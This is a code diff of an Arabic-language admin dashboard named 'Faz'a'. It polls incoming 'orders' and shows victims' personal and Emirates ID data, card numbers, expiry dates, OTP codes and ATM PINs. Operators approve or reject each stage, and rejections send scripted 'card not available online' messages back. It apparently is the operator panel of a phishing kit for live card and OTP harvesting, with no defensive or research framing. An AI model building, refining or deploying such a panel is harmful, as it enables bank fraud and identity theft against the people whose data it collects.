@@ -5,68 +5,384 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>لوحة تحكم فزعة - الإدارة</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; margin: 0; padding: 20px; }
-        .header { background: #1e3a5f; color: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
-        .order-card { background: white; border-radius: 10px; padding: 20px; margin-bottom: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); border-right: 5px solid #d4af37; }
-        .status-badge { padding: 5px 10px; border-radius: 5px; font-size: 12px; font-weight: bold; }
-        .status-waiting { background: #fff3cd; color: #856404; }
-        .status-approved { background: #d4edda; color: #155724; }
-        .status-rejected { background: #f8d7da; color: #721c24; }
-        .data-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 15px; }
-        .data-item { font-size: 14px; }
-        .data-label { color: #6c7a89; font-weight: bold; display: block; }
-        .data-value { color: #1e3a5f; }
-        .actions { margin-top: 20px; display: flex; gap: 10px; }
-        .btn { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; transition: 0.3s; }
-        .btn-approve { background: #28a745; color: white; }
-        .btn-reject { background: #dc3545; color: white; }
-        .btn-logout { background: #f8d7da; color: #721c24; }
-        #loginOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1e3a5f; display: flex; align-items: center; justify-content: center; z-index: 1000; }
-        .login-box { background: white; padding: 30px; border-radius: 10px; text-align: center; }
-        .login-box input { padding: 10px; width: 200px; margin-bottom: 10px; display: block; margin: 10px auto; }
-        .card-data { background: #f8f9fa; padding: 10px; border-radius: 5px; border: 1px dashed #d4af37; margin-top: 10px; }
-        .error-msg { color: #dc3545; font-size: 12px; margin-top: 5px; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            padding: 20px;
+            color: #333;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #1e3a5f 0%, #2d5a8c 100%);
+            color: white;
+            padding: 20px 30px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+
+        .header h1 {
+            font-size: 28px;
+        }
+
+        .logout-btn {
+            background: #dc3545;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+
+        .logout-btn:hover {
+            background: #c82333;
+        }
+
+        #loginOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(30, 58, 95, 0.95);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .login-box {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+            max-width: 400px;
+        }
+
+        .login-box h2 {
+            margin-bottom: 20px;
+            color: #1e3a5f;
+        }
+
+        .login-box input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .login-box button {
+            width: 100%;
+            padding: 12px;
+            background: #28a745;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+            transition: 0.3s;
+        }
+
+        .login-box button:hover {
+            background: #218838;
+        }
+
+        .login-error {
+            color: #dc3545;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+
+        .orders-container {
+            display: grid;
+            gap: 20px;
+        }
+
+        .order-card {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            border-right: 5px solid #d4af37;
+        }
+
+        .order-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .order-id {
+            font-weight: bold;
+            font-size: 16px;
+            color: #1e3a5f;
+        }
+
+        .status-badge {
+            padding: 6px 12px;
+            border-radius: 5px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .status-waiting {
+            background: #fff3cd;
+            color: #856404;
+        }
+
+        .status-approved {
+            background: #d4edda;
+            color: #155724;
+        }
+
+        .status-rejected {
+            background: #f8d7da;
+            color: #721c24;
+        }
+
+        .data-section {
+            margin-bottom: 15px;
+        }
+
+        .section-title {
+            font-weight: bold;
+            color: #1e3a5f;
+            margin-bottom: 10px;
+            padding-bottom: 8px;
+            border-bottom: 2px solid #d4af37;
+            font-size: 14px;
+        }
+
+        .data-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 12px;
+        }
+
+        .data-item {
+            font-size: 13px;
+        }
+
+        .data-label {
+            color: #6c7a89;
+            font-weight: bold;
+            display: block;
+            margin-bottom: 3px;
+        }
+
+        .data-value {
+            color: #1e3a5f;
+            word-break: break-all;
+        }
+
+        .card-data {
+            background: #f8f9fa;
+            padding: 12px;
+            border-radius: 5px;
+            border-left: 4px solid #0066cc;
+            margin-bottom: 12px;
+        }
+
+        .card-data strong {
+            display: block;
+            margin-bottom: 8px;
+            color: #1e3a5f;
+        }
+
+        .otp-data {
+            border-left-color: #28a745;
+        }
+
+        .pin-data {
+            border-left-color: #007bff;
+        }
+
+        .otp-value, .pin-value {
+            font-size: 18px;
+            font-weight: bold;
+            letter-spacing: 2px;
+            font-family: monospace;
+        }
+
+        .otp-value {
+            color: #28a745;
+        }
+
+        .pin-value {
+            color: #007bff;
+        }
+
+        .actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+
+        .btn {
+            padding: 10px 15px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.3s;
+            font-size: 14px;
+            flex: 1;
+            min-width: 120px;
+        }
+
+        .btn-approve {
+            background: #28a745;
+            color: white;
+        }
+
+        .btn-approve:hover {
+            background: #218838;
+        }
+
+        .btn-reject {
+            background: #dc3545;
+            color: white;
+        }
+
+        .btn-reject:hover {
+            background: #c82333;
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .no-orders {
+            text-align: center;
+            color: #6c7a89;
+            padding: 40px 20px;
+            font-size: 16px;
+        }
+
+        .loading {
+            text-align: center;
+            color: #6c7a89;
+            padding: 20px;
+        }
+
+        .current-stage {
+            display: inline-block;
+            background: #e7f3ff;
+            color: #0066cc;
+            padding: 4px 8px;
+            border-radius: 3px;
+            font-size: 12px;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+
+        @media (max-width: 768px) {
+            .order-header {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 10px;
+            }
+
+            .data-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .actions {
+                flex-direction: column;
+            }
+
+            .btn {
+                width: 100%;
+            }
+        }
     </style>
 </head>
 <body>
 
 <div id="loginOverlay">
     <div class="login-box">
-        <h2>تسجيل دخول الإدارة</h2>
-        <input type="password" id="adminPass" placeholder="كلمة المرور">
-        <button class="btn btn-approve" onclick="login()">دخول</button>
-        <p id="loginError" class="error-msg" style="display:none;">كلمة المرور غير صحيحة</p>
+        <h2>🔐 تسجيل دخول الإدارة</h2>
+        <input type="password" id="adminPass" placeholder="أدخل كلمة المرور" autocomplete="off">
+        <button onclick="login()">دخول</button>
+        <p class="login-error" id="loginError">كلمة المرور غير صحيحة</p>
     </div>
 </div>
 
-<div class="header">
-    <h1>لوحة تحكم طلبات فزعة</h1>
-    <button class="btn btn-logout" onclick="logout()">تسجيل خروج</button>
-</div>
+<div id="mainContent" style="display: none;">
+    <div class="header">
+        <h1>📊 لوحة تحكم فزعة</h1>
+        <button class="logout-btn" onclick="logout()">تسجيل خروج</button>
+    </div>
 
-<div id="ordersContainer">
-    <!-- Orders will be loaded here -->
-    <p style="text-align:center; color:#6c7a89;">جاري تحميل الطلبات...</p>
+    <div id="ordersContainer" class="orders-container">
+        <div class="loading">جاري تحميل الطلبات...</div>
+    </div>
 </div>
 
 <script>
     let authToken = localStorage.getItem('adminToken');
-    if (authToken) document.getElementById('loginOverlay').style.display = 'none';
+    const mainContent = document.getElementById('mainContent');
+    const loginOverlay = document.getElementById('loginOverlay');
+
+    if (authToken) {
+        loginOverlay.style.display = 'none';
+        mainContent.style.display = 'block';
+    }
 
     async function login() {
         const password = document.getElementById('adminPass').value;
-        const response = await fetch('/api/login', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ password })
-        });
-        const data = await response.json();
-        if (data.success) {
-            localStorage.setItem('adminToken', data.token);
-            location.reload();
-        } else {
-            document.getElementById('loginError').style.display = 'block';
+        if (!password) {
+            showLoginError('يرجى إدخال كلمة المرور');
+            return;
         }
+
+        try {
+            const response = await fetch('/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ password })
+            });
+            const data = await response.json();
+            if (data.success) {
+                authToken = data.token;
+                localStorage.setItem('adminToken', authToken);
+                loginOverlay.style.display = 'none';
+                mainContent.style.display = 'block';
+                fetchOrders();
+            } else {
+                showLoginError('كلمة المرور غير صحيحة');
+            }
+        } catch (e) {
+            console.error(e);
+            showLoginError('حدث خطأ في الاتصال');
+        }
+    }
+
+    function showLoginError(msg) {
+        const errorEl = document.getElementById('loginError');
+        errorEl.textContent = msg;
+        errorEl.style.display = 'block';
     }
 
     function logout() {
@@ -82,90 +398,215 @@
             });
             const orders = await response.json();
             renderOrders(orders);
-        } catch (e) { console.error(e); }
+        } catch (e) {
+            console.error('Error fetching orders:', e);
+        }
     }
 
     function renderOrders(orders) {
         const container = document.getElementById('ordersContainer');
-        if (orders.length === 0) {
-            container.innerHTML = '<p style="text-align:center; color:#6c7a89;">لا توجد طلبات حالياً</p>';
+        
+        if (!orders || orders.length === 0) {
+            container.innerHTML = '<div class="no-orders">لا توجد طلبات حالياً</div>';
             return;
         }
-        
-        container.innerHTML = orders.reverse().map(order => `
-            <div class="order-card">
-                <div style="display:flex; justify-content:space-between;">
-                    <strong>طلب رقم: ${order.id}</strong>
-                    <span class="status-badge ${getStatusClass(order.status)}">${getStatusText(order.status)}</span>
-                </div>
-                <div class="data-grid">
-                    <div class="data-item"><span class="data-label">الاسم</span><span class="data-value">${order.full_name || '---'}</span></div>
-                    <div class="data-item"><span class="data-label">الهوية</span><span class="data-value">${order.emirates_id || '---'}</span></div>
-                    <div class="data-item"><span class="data-label">الهاتف</span><span class="data-value">${order.phone || '---'}</span></div>
-                    <div class="data-item"><span class="data-label">الباقة</span><span class="data-value">${order.card_type || '---'}</span></div>
-                </div>
-                
-                ${order.cardNumber ? `
-                <div class="card-data">
-                    <strong>بيانات البطاقة:</strong>
-                    <div class="data-grid">
-                        <div class="data-item"><span class="data-label">الرقم</span><span class="data-value">${order.cardNumber}</span></div>
-                        <div class="data-item"><span class="data-label">التاريخ</span><span class="data-value">${order.expiryDate}</span></div>
-                        <div class="data-item"><span class="data-label">CVV</span><span class="data-value">${order.cvv}</span></div>
+
+        container.innerHTML = orders.reverse().map(order => {
+            const stage = getCurrentStage(order.status);
+            const canApprove = isAwaitingApproval(order.status);
+            
+            return `
+                <div class="order-card">
+                    <div class="order-header">
+                        <div>
+                            <span class="order-id">طلب رقم: ${order.id}</span>
+                            <span class="current-stage">${stage}</span>
+                        </div>
+                        <span class="status-badge ${getStatusClass(order.status)}">${getStatusText(order.status)}</span>
                     </div>
-                </div>
-                ` : ''}
 
-                ${order.otp ? `<div class="card-data" style="border-color: #28a745;"><strong>الـ OTP:</strong> <span style="font-size:20px; color:#28a745;">${order.otp}</span></div>` : ''}
-                ${order.pin ? `<div class="card-data" style="border-color: #007bff;"><strong>الـ PIN:</strong> <span style="font-size:20px; color:#007bff;">${order.pin}</span></div>` : ''}
+                    <!-- Personal Information -->
+                    <div class="data-section">
+                        <div class="section-title">👤 البيانات الشخصية</div>
+                        <div class="data-grid">
+                            <div class="data-item">
+                                <span class="data-label">الاسم الكامل</span>
+                                <span class="data-value">${order.full_name || '---'}</span>
+                            </div>
+                            <div class="data-item">
+                                <span class="data-label">الهاتف</span>
+                                <span class="data-value">${order.phone || '---'}</span>
+                            </div>
+                            <div class="data-item">
+                                <span class="data-label">البريد الإلكتروني</span>
+                                <span class="data-value">${order.email || '---'}</span>
+                            </div>
+                            <div class="data-item">
+                                <span class="data-label">رقم الهوية</span>
+                                <span class="data-value">${order.emirates_id || '---'}</span>
+                            </div>
+                        </div>
+                    </div>
 
-                <div class="actions">
-                    ${order.status === 'waiting_admin_approval' || order.status === 'otp_submitted' || order.status === 'pin_submitted' ? `
-                        <button class="btn btn-approve" onclick="updateStatus('${order.id}', 'approved')">قبول (توجيه للخطوة التالية)</button>
-                        <button class="btn btn-reject" onclick="promptReject('${order.id}')">رفض (إعادة لصفحة البطاقة)</button>
+                    <!-- Card Information -->
+                    ${order.cardNumber ? `
+                    <div class="data-section">
+                        <div class="section-title">💳 بيانات البطاقة</div>
+                        <div class="card-data">
+                            <strong>رقم البطاقة (آخر 4 أرقام):</strong>
+                            <span class="data-value">**** **** **** ${order.cardNumber.slice(-4)}</span>
+                        </div>
+                        <div class="data-grid">
+                            <div class="data-item">
+                                <span class="data-label">اسم صاحب البطاقة</span>
+                                <span class="data-value">${order.cardName || '---'}</span>
+                            </div>
+                            <div class="data-item">
+                                <span class="data-label">تاريخ الانتهاء</span>
+                                <span class="data-value">${order.expiryDate || '---'}</span>
+                            </div>
+                            <div class="data-item">
+                                <span class="data-label">CVV</span>
+                                <span class="data-value">***</span>
+                            </div>
+                        </div>
+                    </div>
+                    ` : ''}
+
+                    <!-- OTP -->
+                    ${order.otp ? `
+                    <div class="data-section">
+                        <div class="section-title">🔐 رمز التحقق (OTP)</div>
+                        <div class="card-data otp-data">
+                            <span class="otp-value">${order.otp}</span>
+                        </div>
+                    </div>
+                    ` : ''}
+
+                    <!-- PIN -->
+                    ${order.pin ? `
+                    <div class="data-section">
+                        <div class="section-title">🏧 الرقم السري (ATM PIN)</div>
+                        <div class="card-data pin-data">
+                            <span class="pin-value">****</span>
+                        </div>
+                    </div>
+                    ` : ''}
+
+                    <!-- Actions -->
+                    ${canApprove ? `
+                    <div class="actions">
+                        <button class="btn btn-approve" onclick="approveOrder('${order.id}', '${order.status}')">✅ قبول</button>
+                        <button class="btn btn-reject" onclick="rejectOrder('${order.id}', '${order.status}')">❌ رفض</button>
+                    </div>
                     ` : ''}
                 </div>
-            </div>
-        `).join('');
+            `;
+        }).join('');
+    }
+
+    function getCurrentStage(status) {
+        const stages = {
+            'waiting_payment': 'مرحلة البطاقة',
+            'waiting_otp': 'مرحلة OTP',
+            'waiting_pin': 'مرحلة PIN',
+            'approved_payment': 'تم قبول البطاقة',
+            'approved_otp': 'تم قبول OTP',
+            'approved_pin': 'تم قبول PIN',
+            'rejected_payment': 'تم رفض البطاقة',
+            'rejected_otp': 'تم رفض OTP',
+            'rejected_pin': 'تم رفض PIN'
+        };
+        return stages[status] || status;
+    }
+
+    function isAwaitingApproval(status) {
+        return ['waiting_payment', 'waiting_otp', 'waiting_pin'].includes(status);
     }
 
     function getStatusClass(status) {
-        if (status === 'approved') return 'status-approved';
-        if (status === 'rejected') return 'status-rejected';
+        if (status.includes('approved')) return 'status-approved';
+        if (status.includes('rejected')) return 'status-rejected';
         return 'status-waiting';
     }
 
     function getStatusText(status) {
         const texts = {
-            'personal_data_submitted': 'بيانات شخصية فقط',
-            'waiting_admin_approval': 'بانتظار الموافقة على البطاقة',
-            'approved': 'تم القبول',
-            'rejected': 'تم الرفض',
-            'otp_submitted': 'تم إدخال OTP',
-            'pin_submitted': 'تم إدخال PIN'
+            'waiting_payment': 'بانتظار الموافقة على البطاقة',
+            'waiting_otp': 'بانتظار الموافقة على OTP',
+            'waiting_pin': 'بانتظار الموافقة على PIN',
+            'approved_payment': 'تم قبول البطاقة',
+            'approved_otp': 'تم قبول OTP',
+            'approved_pin': 'تم قبول PIN',
+            'rejected_payment': 'تم رفض البطاقة',
+            'rejected_otp': 'تم رفض OTP',
+            'rejected_pin': 'تم رفض PIN'
         };
         return texts[status] || status;
     }
 
-    async function updateStatus(orderId, status, error = '') {
-        await fetch('/api/update-order-status', {
-            method: 'POST',
-            headers: { 
-                'Content-Type': 'application/json',
-                'Authorization': authToken
-            },
-            body: JSON.stringify({ orderId, status, error })
-        });
+    async function approveOrder(orderId, status) {
+        let newStatus = 'approved_payment';
+        if (status === 'waiting_otp') newStatus = 'approved_otp';
+        if (status === 'waiting_pin') newStatus = 'approved_pin';
+
+        try {
+            await fetch('/api/update-order-status', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': authToken
+                },
+                body: JSON.stringify({ orderId, status: newStatus })
+            });
+            fetchOrders();
+        } catch (e) {
+            console.error('Error approving order:', e);
+            alert('حدث خطأ أثناء الموافقة');
+        }
+    }
+
+    async function rejectOrder(orderId, status) {
+        let errorMsg = '';
+        
+        if (status === 'waiting_payment') {
+            errorMsg = 'تم رفض عملية الدفع، بطاقتك غير متاحة للدفع عبر الإنترنت. يرجى التواصل مع المصرف أو تجربة طرق دفع أخرى.';
+        } else if (status === 'waiting_otp') {
+            errorMsg = 'الرمز غير صالح أو بطاقتك غير متاحة للدفع عبر الإنترنت. يرجى التواصل مع المصرف أو استخدام طرق دفع أخرى.';
+        } else if (status === 'waiting_pin') {
+            errorMsg = 'رقم الصراف الآلي غير صحيح، قد تكون بطاقتك غير متاحة للدفع عبر الإنترنت. يرجى التواصل مع المصرف أو استخدام طرق دفع مختلفة.';
+        }
+
+        let newStatus = 'rejected_payment';
+        if (status === 'waiting_otp') newStatus = 'rejected_otp';
+        if (status === 'waiting_pin') newStatus = 'rejected_pin';
+
+        try {
+            await fetch('/api/update-order-status', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': authToken
+                },
+                body: JSON.stringify({ orderId, status: newStatus, lastError: errorMsg })
+            });
+            fetchOrders();
+        } catch (e) {
+            console.error('Error rejecting order:', e);
+            alert('حدث خطأ أثناء الرفض');
+        }
+    }
+
+    // Fetch orders every 2 seconds
+    if (authToken) {
+        setInterval(fetchOrders, 2000);
         fetchOrders();
     }
 
-    function promptReject(orderId) {
-        const msg = prompt("أدخل رسالة الخطأ (ستظهر للعميل):", "عذراً، البطاقة غير صالحة. يرجى المحاولة مرة أخرى.");
-        if (msg) updateStatus(orderId, 'rejected', msg);
-    }
-
-    setInterval(fetchOrders, 3000); // Poll every 3 seconds
-    fetchOrders();
+    // Allow Enter key to login
+    document.getElementById('adminPass')?.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') login();
+    });
 </script>
 
 </body>
